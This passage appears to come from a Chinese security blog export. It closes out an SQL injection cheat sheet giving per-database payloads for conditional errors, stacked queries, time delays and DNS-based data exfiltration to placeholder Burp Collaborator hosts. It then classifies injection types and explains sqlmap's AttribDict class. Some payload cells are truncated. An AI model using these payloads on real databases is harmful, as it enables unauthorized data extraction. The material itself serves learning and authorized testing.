<td align="left"><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
</tr>
</tbody></table>
<hr>
<h1 id="Conditional-errors-条件错误"><a href="#Conditional-errors-条件错误" class="headerlink" title="Conditional errors 条件错误"></a>Conditional errors 条件错误</h1><p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
<table>
<thead>
<tr>
<th align="left">database</th>
<th align="left">example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</code></td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td>
</tr>
</tbody></table>
<hr>
<h1 id="Batched-or-stacked-queries-批量查询"><a href="#Batched-or-stacked-queries-批量查询" class="headerlink" title="Batched (or stacked) queries 批量查询"></a>Batched (or stacked) queries 批量查询</h1><p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
<table>
<thead>
<tr>
<th align="left">database</th>
<th align="left">example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td align="left"><code>Does not support batched queries.</code></td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td align="left"><code>Does not support batched queries.</code></td>
</tr>
</tbody></table>
<hr>
<h1 id="Time-delays-时间延迟"><a href="#Time-delays-时间延迟" class="headerlink" title="Time delays 时间延迟"></a>Time delays 时间延迟</h1><p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
<table>
<thead>
<tr>
<th align="left">database</th>
<th align="left">example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td align="left"><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td align="left"><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td align="left"><code>SELECT pg_sleep(10)</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td align="left"><code>	SELECT sleep(10)</code></td>
</tr>
</tbody></table>
<hr>
<h1 id="Conditional-time-delays-有条件的时间延迟"><a href="#Conditional-time-delays-有条件的时间延迟" class="headerlink" title="Conditional time delays 有条件的时间延迟"></a>Conditional time delays 有条件的时间延迟</h1><p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
<table>
<thead>
<tr>
<th align="left">database</th>
<th align="left">example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td align="left">&#96;SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN ‘a’</td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td align="left"><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,sleep(10),&#39;a&#39;)</code></td>
</tr>
</tbody></table>
<hr>
<h1 id="DNS-lookup-DNS查询"><a href="#DNS-lookup-DNS查询" class="headerlink" title="DNS lookup DNS查询"></a>DNS lookup DNS查询</h1><p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
<table>
<thead>
<tr>
<th align="left">database</th>
<th align="left">example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td align="left">The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<code>SELECT extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code><br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<code>SELECT UTL_INADDR.get_host_address(&#39;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;)</code></td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td align="left"><code>exec master..xp_dirtree &#39;//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&#39;</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td align="left"><code>copy (SELECT &#39;&#39;) to program &#39;nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td align="left">The following techniques work on Windows only:<br><code>LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)</code><br><code>SELECT ... INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
</tr>
</tbody></table>
<hr>
<h1 id="DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找"><a href="#DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找" class="headerlink" title="DNS lookup with data exfiltration 使用数据泄露进行DNS查找"></a>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</h1><p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
<table>
<thead>
<tr>
<th align="left">database</th>
<th align="left">example</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Oracle</td>
<td align="left">&#96;SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?>&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM “http:&#x2F;&#x2F;‘</td>
</tr>
<tr>
<td align="left">Microsoft</td>
<td align="left"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&#39;)</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td align="left">create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c :&#x3D; ‘copy (SELECT ‘’’’) to program ‘’nslookup ‘</td>
</tr>
<tr>
<td align="left">MySQL</td>
<td align="left">The following technique works on Windows only:<code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
</tr>
</tbody></table>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>SQL注入在不同数据库的表现,可表现在这些方面:</p>
<ul>
<li>String concatenation 字符串连接</li>
<li>Comments 注释</li>
<li>Database version 数据库版本的查询</li>
<li>Database contents 数据库内容的查询</li>
<li>Conditional errors 条件错误</li>
<li>Batched (or stacked) queries 批量查询</li>
<li>Time delays 时间延迟</li>
<li>Conditional time delays 有条件的时间延迟</li>
<li>DNS lookup DNS查询<br>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</li>
</ul>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-注入的分类</title>
    <url>//13187.html</url>
    <content><![CDATA[<h1 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h1><ul>
<li>基于错误的SQL注入</li>
<li>联合查询的类型</li>
<li>堆查询注射</li>
<li>SQL盲注</li>
<li>基于布尔SQL盲注</li>
<li>基于时间的SQL盲注</li>
<li>基于报错的SQL盲注</li>
</ul>
<h1 id="基于如何处理输入的SQL查询-数据类型"><a href="#基于如何处理输入的SQL查询-数据类型" class="headerlink" title="基于如何处理输入的SQL查询(数据类型)"></a>基于如何处理输入的SQL查询(数据类型)</h1><ul>
<li>基于字符串</li>
<li>数字或整数为基础</li>
</ul>
<h1 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h1><ul>
<li><p>一阶注射</p>
</li>
<li><p>二阶注射</p>
</li>
</ul>
<p>一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.</p>
<h1 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h1><ul>
<li>通过用户输入的表单域的注射</li>
<li>通过cookie注射</li>
<li>通过服务器变量注射(基于头部信息的注射)</li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqlmap源码-AttribDict属性字典</title>
    <url>//11158.html</url>
    <content><![CDATA[<h1 id="pre"><a href="#pre" class="headerlink" title="pre:"></a>pre:</h1><p>sqlmap在处理数据的时候大量使用了自定义的<code>AttribDict</code>属性字典这个数据类型.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sqlmap paths</span></span><br><span class="line">paths = AttribDict()</span><br><span class="line"></span><br><span class="line"><span class="comment"># object to store original command line options</span></span><br><span class="line">cmdLineOptions = AttribDict()</span><br><span class="line"></span><br><span class="line"><span class="comment"># object to store merged options (command line, configuration file and default options)</span></span><br><span class="line">mergedOptions = AttribDict()</span><br><span class="line"></span><br><span class="line"><span class="comment"># object to share within function and classes command</span></span><br><span class="line"><span class="comment"># line options and settings</span></span><br><span class="line">conf = AttribDict()</span><br><span class="line"></span><br><span class="line"><span class="comment"># object to share within function and classes results</span></span><br><span class="line">kb = AttribDict()</span><br></pre></td></tr></table></figure>

<p>所以有必要看看<code>AttribDict</code>这个类.</p>
<p>顺便总结一下自己不熟悉的相关知识点.</p>
<hr>
<h1 id="AttribDict组成"><a href="#AttribDict组成" class="headerlink" title="AttribDict组成:"></a><code>AttribDict</code>组成:</h1><p>这个类通过override了几个<code>super method</code>.</p>
<p>修改原生的<code>dict</code>定制成了自己项目需要的属性字典.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d71bed008.jpg"></p>
<hr>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义:"></a>定义:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">This class defines the sqlmap object, inheriting from Python data</span><br><span class="line">type dictionary.</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; foo = AttribDict()</span><br><span class="line">&gt;&gt;&gt; foo.bar = 1</span><br><span class="line">&gt;&gt;&gt; foo.bar</span><br><span class="line">1</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>原来的字典的用法:<code>dict1[&quot;key&quot;]</code><br>现在的自定义字典的用法:<code>dict1.key</code></p>
<hr>
<h2 id="init-初始化"><a href="#init-初始化" class="headerlink" title="__init__ 初始化"></a><code>__init__</code> 初始化</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, indict=<span class="literal">None</span>, attribute=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> indict <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line">        indict = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Set any attributes here - before initialisation</span></span><br><span class="line">    <span class="comment"># these remain as normal attributes   在初始化之前设置通用属性</span></span><br><span class="line">    self.attribute = attribute</span><br><span class="line">    <span class="built_in">dict</span>.__init__(self, indict)</span><br><span class="line">    self.__initialised = <span class="literal">True</span> <span class="comment"># 初始化标志</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># After initialisation, setting attributes</span></span><br><span class="line">    <span class="comment"># is the same as setting an item  初始化之后</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="setattr-对一个属性赋值"><a href="#setattr-对一个属性赋值" class="headerlink" title="__setattr__ 对一个属性赋值"></a><code>__setattr__</code> 对一个属性赋值</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__setattr__</span>(<span class="params">self, item, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Maps attributes to values</span></span><br><span class="line"><span class="string">    Only if we are initialised   只对初始化过的实例赋值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># This test allows attributes to be set in the __init__ method</span></span><br><span class="line">    <span class="comment"># 允许在初始化的时候设置属性</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;_AttribDict__initialised&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> self.__dict__:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dict</span>.__setattr__(self, item, value)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Any normal attributes are handled normally</span></span><br><span class="line">    <span class="keyword">elif</span> item <span class="keyword">in</span> self.__dict__: <span class="comment"># 如果已经设置过了</span></span><br><span class="line">        <span class="built_in">dict</span>.__setattr__(self, item, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># 没设置过的</span></span><br><span class="line">        self.__setitem__(item, value)</span><br></pre></td></tr></table></figure>

<p>例如执行以下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">kb = AttribDict()</span><br><span class="line">kb.a = <span class="number">1</span> </span><br></pre></td></tr></table></figure>

<p><code>kb = AttribDict()</code>执行完,也就初始化完<code>kb</code>这个实例了,对象的属性储存在对象的<code>__dict__</code>属性中,这个时候它的<code>__dict__</code>为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;_AttribDict__initialised&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;attribute&#x27;</span>: <span class="literal">None</span>&#125;</span><br></pre></td></tr></table></figure>

<p>执行<code>kb.a=1</code>即对实例的属性赋值的时候,就会隐式调用到<code>__setattr__</code>这个super method.</p>
<p>首先会在<code>__dict__</code>搜索是否初始化过的标志属性</p>
<ul>
<li><p>如果未初始化过的话,返回一个<code>dict</code>.</p>
</li>
<li><p>如果初始化过的实例,会根据<code>key</code>在<code>__dict__</code>搜索</p>
<ul>
<li>如果这个属性已经设置过的话,会调用<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dict</span>.__setattr__(self, item, value)</span><br><span class="line"><span class="comment"># 相当于执行`self.itme = value`,对一个属性赋值(覆盖已有属性)</span></span><br></pre></td></tr></table></figure></li>
<li>如果这个属性没设置过的话,会调用<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.__setitem__(item, value)</span><br><span class="line"><span class="comment"># 相当于执行`self[key] = val`,对新索引值赋值</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<hr>
<h2 id="getattr-访问一个不存在的属性"><a href="#getattr-访问一个不存在的属性" class="headerlink" title="__getattr__ 访问一个不存在的属性"></a><code>__getattr__</code> 访问一个不存在的属性</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, item</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    Maps values to attributes</span></span><br><span class="line"><span class="string">    Only called if there *is NOT* an attribute with this name </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> self.__getitem__(item) <span class="comment"># 通过key获取value</span></span><br><span class="line">    <span class="keyword">except</span> KeyError:</span><br><span class="line">        <span class="keyword">raise</span> AttributeError(<span class="string">&quot;unable to access item &#x27;%s&#x27;&quot;</span> % item)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">kb = AttribDict()</span><br><span class="line"><span class="built_in">print</span> kb.a</span><br></pre></td></tr></table></figure>

<p>执行<code>print kb.a</code>的时候,访问一个不存在的属性的时候,会隐式调用<code>__getattr__</code>这个super method.</p>
<p>当属性不存在的时候,<code>__getattr__</code>会raise an AttributeError exception.</p>
<ul>
<li><p>默认的<code>__getattr__</code>的报错:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeError: &#x27;AttribDict&#x27; object has no attribute &#x27;a&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改过的<code>__getattr__</code>的报错:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeError: unable to access item &#x27;a&#x27;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>额,效果只是让错误输出更友好而已….</p>
<hr>
<h2 id="getstate-序列化"><a href="#getstate-序列化" class="headerlink" title="__getstate__ 序列化"></a><code>__getstate__</code> 序列化</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> self.__dict__</span><br></pre></td></tr></table></figure>

<p>代替对象的__dict__属性被保存。</p>
<p>当对象pickled，你可返回一个自定义的状态被保存。<br>当对象unpickled时，这个状态将会被<code>__setstate__</code>使用。</p>
<hr>
<h2 id="setstate-序列化"><a href="#setstate-序列化" class="headerlink" title="__setstate__ 序列化"></a><code>__setstate__</code> 序列化</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, <span class="built_in">dict</span></span>):</span><br><span class="line">    self.__dict__ = <span class="built_in">dict</span></span><br></pre></td></tr></table></figure>

<p>对象unpickled时，如果<code>__setstate__</code>定义对象状态会传递来代替用对象的__dict__属性。</p>
<p>这正好跟<code>__getstate__</code>手牵手：当二者都被定义了，你可以描述对象的pickled状态，任何你想要的。</p>
<hr>
<h2 id="deepcopy-深复制"><a href="#deepcopy-深复制" class="headerlink" title="__deepcopy__ 深复制"></a><code>__deepcopy__</code> 深复制</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__deepcopy__</span>(<span class="params">self, memo</span>):</span><br><span class="line">    retVal = self.__class__()</span><br><span class="line">    memo[<span class="built_in">id</span>(self)] = retVal</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> attr <span class="keyword">in</span> <span class="built_in">dir</span>(self):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> attr.startswith(<span class="string">&#x27;_&#x27;</span>):</span><br><span class="line">            value = <span class="built_in">getattr</span>(self, attr)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, (types.BuiltinFunctionType, types.FunctionType, types.MethodType)):</span><br><span class="line">                <span class="built_in">setattr</span>(retVal, attr, copy.deepcopy(value, memo))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> self.items():</span><br><span class="line">        retVal.__setitem__(key, copy.deepcopy(value, memo))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对于简单的 object，用 shallow copy 和 deep copy 没区别</p>
</blockquote>
<blockquote>
<p>复杂的 object， 如 list 中套着 list 的情况，shallow copy 中的 子list，并未从原 object 真的「独立」出来。也就是说，如果你改变原 object 的子 list 中的一个元素，你的 copy 就会跟着一起变。这跟我们直觉上对「复制」的理解不同。</p>
</blockquote>
<p>嵌套的复杂object,为了保证数据的独立性,要尽量的使用deepcopy.</p>
<hr>
<h1 id="好处"><a href="#好处" class="headerlink" title="好处:"></a>好处:</h1><p>kb作为一个全局的字典,保留了相关的配置信息,很多代码里都会用到这个全局的字典,暂时能想到这样的好处就是</p>
<ul>
<li>大篇幅代码都用到的话,<code>dict1.key</code>比<code>dict1[&quot;key&quot;]</code>看起来更简洁.更pythonic.</li>
<li>可以自定义更加友好的错误输出提示信息.</li>
<li>扫描中断需要继续的话,可以自定义序列化的内容,便于自己保存对象.</li>
</ul>
<hr>
<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点:"></a>相关知识点:</h1><h2 id="special-method"><a href="#special-method" class="headerlink" title="special method:"></a>special method:</h2><h3 id="特殊之处在哪呢"><a href="#特殊之处在哪呢" class="headerlink" title="特殊之处在哪呢?"></a>特殊之处在哪呢?</h3><p>它的特殊之处在于:</p>
<p>如果把Python当成一个<code>framework</code>的话，这些预留的特殊方法相当于接口<code>interface</code>.</p>
<p>你可以通过这些接口,使得<code>your-object</code>就跟<code>built-in object</code>高度一致,也能复用到<code>built in-object</code>原有的强大的功能.</p>
<hr>
<h2 id="有哪些类型的接口呢"><a href="#有哪些类型的接口呢" class="headerlink" title="有哪些类型的接口呢?"></a>有哪些类型的接口呢?</h2><p>可以在以下这些方面定制你自己的类:</p>
<ol>
<li>构造和初始化</li>
<li>控制属性访问</li>
<li>创建自定义容器</li>
<li>反射</li>
<li>可调用的对象</li>
<li>上下文管理</li>
<li>创建对象描述器</li>
<li>复制</li>
</ol>
<hr>
<h3 id="什么时候会用到特殊方法呢"><a href="#什么时候会用到特殊方法呢" class="headerlink" title="什么时候会用到特殊方法呢?"></a>什么时候会用到特殊方法呢?</h3><p><strong>原有的数据类型的功能不能满足你的要求.</strong></p>
<p>例子:</p>
<ol>
<li>你可以像sqlmap这里的<code>AttribDict</code>在原生字典的基础上构造自己符合自己项目的数据类型.</li>
<li>自带的<code>dict</code>是无序的,如果你想用有序的字典.你可以用<code>collections</code>模块的<code>OrderedDict</code>.而这个<code>OrderedDict</code>就是在<code>dict</code>的基础上拓展来的.</li>
</ol>
<hr>
<h2 id="dict-对象的属性系统"><a href="#dict-对象的属性系统" class="headerlink" title="__dict__ 对象的属性系统:"></a><code>__dict__</code> 对象的属性系统:</h2><ul>
<li>对象的属性储存在对象的<code>__dict__</code>属性中</li>
<li><code>__dict__</code>为一个词典，键为属性名，对应的值为属性本身.</li>
</ul>
<p>来源:</p>
<ul>
<li><code>类属性(class attribute)</code>: 类定义 or 根据类定义继承来的</li>
<li><code>对象属性(object attribute)</code>: 对象实例定义的</li>
</ul>
<p>例子:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">bird</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    feather = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">chicken</span>(<span class="title class_ inherited__">bird</span>):</span><br><span class="line">    fly = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, age</span>):</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">summer = chicken(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bird.__dict__)</span><br><span class="line"><span class="built_in">print</span>(chicken.__dict__)</span><br><span class="line"><span class="built_in">print</span>(summer.__dict__)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bird对象属性 比如feather</span></span><br><span class="line">&#123;<span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;bird&#x27;</span> objects&gt;, <span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="string">&#x27;__weakref__&#x27;</span> of <span class="string">&#x27;bird&#x27;</span> objects&gt;, <span class="string">&#x27;feather&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># chicken对象属性 比如fly和__init__方法</span></span><br><span class="line">&#123;<span class="string">&#x27;fly&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__init__&#x27;</span>: &lt;function __init__ at <span class="number">0x2b91db476d70</span>&gt;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># summer对象属性 比如age</span></span><br><span class="line">&#123;<span class="string">&#x27;age&#x27;</span>: <span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>

<p>有一些属性，比如<code>__doc__</code>，并不是由我们定义的，而是由Python自动生成。</p>
<p>此外，bird类也有父类，是object类(正如我们的bird定义，<code>class bird(object)</code>)。</p>
<p>这个object类是Python中所有类的父类。</p>
<p>可以看到，<strong>Python中的属性是分层定义的</strong>，比如这里分为<code>object/bird/chicken/summer</code>这四层。</p>
<p><strong>当我们需要调用某个属性的时候，Python会一层层向上遍历，直到找到那个属性。</strong>(某个属性可能出现再不同的层被重复定义，Python向上的过程中，会选取先遇到的那一个，也就是比较低层的属性定义)。</p>
<p>当我们有一个summer对象的时候，分别查询summer对象、chicken类、bird类以及object类的属性，就可以知道summer对象所有的<code>__dict__</code>，就可以找到通过对象summer可以调用和修改的所有属性了.</p>
<p>refs: <a href="https://www.cnblogs.com/vamei/archive/2012/12/11/2772448.html">Python深入03 对象的属性</a></p>
<hr>
<h2 id="deep-copy和shadow-copy"><a href="#deep-copy和shadow-copy" class="headerlink" title="deep copy和shadow copy:"></a>deep copy和shadow copy:</h2><blockquote>
<ul>
<li>我们寻常意义的复制就是深复制，即将被复制对象完全再复制一遍作为独立的新个体单独存在。所以改变原有被复制对象不会对已经复制出来的新对象产生影响。 </li>
<li>而浅复制并不会产生一个独立的对象单独存在，他只是将原有的数据块打上一个新标签，所以当其中一个标签被改变的时候，数据块就会发生变化，另一个标签也会随之改变。这就和我们寻常意义上的复制有所不同了。</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>对于简单的 object，用 shallow copy 和 deep copy 没区别</li>
</ul>
</blockquote>
<blockquote>
<ul>
<li>复杂的 object， 如 list 中套着 list 的情况，shallow copy 中的 子list，并未从原 object 真的「独立」出来。也就是说，如果你改变原 object 的子 list 中的一个元素，你的 copy 就会跟着一起变。这跟我们直觉上对「复制」的理解不同。</li>
</ul>
</blockquote>
<p>refs: <a href="https://www.cnblogs.com/hokky/p/8476698.html">Python-copy()与deepcopy()区别</a></p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><p><a href="https://stackoverflow.com/questions/2033150/subclassing-dict-should-dict-init-be-called">Subclassing dict: should dict.<strong>init</strong>() be called?</a></p>
</li>
<li><p><a href="https://blog.csdn.net/yuxinleipp/article/details/7869290">Python 方法调用机制</a></p>
</li>
<li><p><a href="https://stackoverflow.com/questions/12627949/python-override-getstate-and-setstate">Python, override__getstate__() and <strong>setstate</strong>()</a></p>
</li>
<li><p><a href="https://blog.csdn.net/codingwithme/article/details/41675679">sqlmap源码阅读之基础(dict,sys)</a></p>
</li>
<li><p><a href="http://python.jobbole.com/88367/">Python 魔术方法 - Magic Method</a></p>
</li>
<li><p><a href="https://pycoders-weekly-chinese.readthedocs.io/en/latest/issue6/a-guide-to-pythons-magic-methods.html#id13">Python 魔术方法指南</a></p>
</li>
<li><p><a href="https://docs.python.org/2/reference/datamodel.html#customizing-attribute-access">3. Data model</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/vamei/archive/2012/12/11/2772448.html">Python深入03 对象的属性</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/blackmatrix/p/5630515.html">Python新式类与经典类的区别</a></p>
</li>
<li><p><a href="https://www.peterbe.com/plog/must__deepcopy__">When to <strong>deepcopy</strong> classes in Python</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/hokky/p/8476698.html">Python-copy()与deepcopy()区别</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
